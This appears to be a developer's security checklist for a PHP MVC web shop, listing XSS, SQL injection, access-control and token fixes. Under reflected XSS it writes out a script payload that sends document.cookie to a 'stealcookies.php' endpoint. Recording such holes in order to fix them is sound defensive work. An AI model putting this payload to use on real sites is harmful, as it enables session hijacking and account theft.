- XSS: 
	+ stored XSS -> use htmlentities (done)
		+ payload: 

		```


		```

		+ section need to fix: 
			+ review
			+ profile
			+ account in admin dashboard
			
	+ reflected XSS -> set httponly: true | x-xss-protection header is enabled??
		+ payload: 

		```
		localhost/bakya_mvc?controller=<script>window.location.href="http://localhost/EXPLOIT/stealcookies.php?c=".concat(document.cookie);</script>

		```

- SQL injection: 
	+ product search bar 

- restricted access: disallow restricted url

- invalid token: give timestamp for token

- avoid error when url is invalid